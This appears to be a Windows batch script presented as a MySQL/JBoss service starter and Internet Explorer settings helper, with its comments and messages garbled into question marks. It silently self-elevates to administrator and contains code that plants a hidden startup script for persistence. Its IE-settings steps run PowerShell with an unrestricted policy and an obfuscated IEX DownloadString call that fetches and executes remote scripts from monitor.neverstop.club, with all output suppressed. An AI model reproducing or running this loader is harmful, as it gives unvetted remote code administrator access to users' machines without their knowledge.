@echo off
rem ???????????
(cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1


cls
echo.
echo.          ###########################################################
echo.          ##                                                       ##
echo.          ##    ???????��????????...                            ##
echo.          ##    ????????????????????��????????????       ##
echo.          ##    ?????????????????????                       ##
echo.          ##   ------------------------------------------------    ##
echo.          ##    ???????????? "?????????" ?????????     ##
echo.          ##    ?? "?????????" ???????????????????       ##
echo.          ##                                                       ##
echo.          ###########################################################

@echo off
goto ARP
rem ???????????��??????????????????????��???????????????????????????
rem ?????????APR????????????????
set ARP="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat"
if exist %ARP% (
    goto MySQL
	) ELSE (
	echo if "%%1"=="hide" goto CmdBegin >%ARP%
    echo start mshta vbscript:createobject("wscript.shell"^).run("""%%~0"" hide",0^)(window.close^)^&^&^exit >>%ARP%
    echo :CmdBegin >>%ARP%
    echo ???????????????????????????????? >>%ARP%
	echo @echo off >>%ARP%
	echo for /f "tokens=2 delims=:" %%%%i in ('ipconfig^^^|findstr /c:"IPv4"'^) do (for /f "tokens=1,2,3,4 delims=." %%%%a in ('echo %%%%i'^) do set Three=%%%%c^) ^>nul >>%ARP%
    echo for /L %%%%i in (1,1,254^) do ping -w 2 -n 1 192.168.%%Three%%.%%%%i ^>nul >>%ARP%
	goto ARP
)

:ARP
rem ???????ip????��???????arp??
echo.          ===========================================================
echo.
echo                  ???????ARP???��????120???????...
echo.
echo.          ===========================================================
rem for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
rem for /L %%i in (1,1,254) do ping -w 2 -n 1 192.168.%Three%.%%i >nul
goto MySQL

:Jboss
rem ???????????jboss?????��?????????
rem ??��??????????????????Jboss???????????????
SC QUERY jboss >NUL 2>&1
if errorlevel 1060 (
    echo ��???Jboss????????????????????...
    goto IESettings
) else (
    echo ???Jboss????????????????????...
    goto StartJboss
)

:MySQL
rem ???MySQL?????????????��?????????
set M_Status=1 
(tasklist|findstr "mysql"||set M_Status=0) >nul 2>&1
IF %M_Status% EQU 0 (
    echo ��??? MySQL ????????????????????...
    goto IESettings
) ELSE (
    echo ??? MySQL ?????????? Jboss ?????????...
    goto StartJboss
)

:StartJboss
rem ???Jboss?????????????????????????????
net start jboss >NUL 2>&1
if errorlevel 1058 (
    echo Jboss?????????????????????????????...
    goto IESettings
) else (
    net start "Inspur lcgxsjjh" 
    goto PrimaryIESettings
)

:PrimaryIESettings
rem ????????powershell???????????????????????
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul 2>&1
goto bye

:IESettings
rem ???????powershell???????????????????????
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul 2>&1
goto bye

:bye
echo.          ===========================================================
echo.
echo                  ???????????????????IE????????????...
echo.
echo.          ===========================================================
@ping 127.0.0.1 -n 8 >nul
exit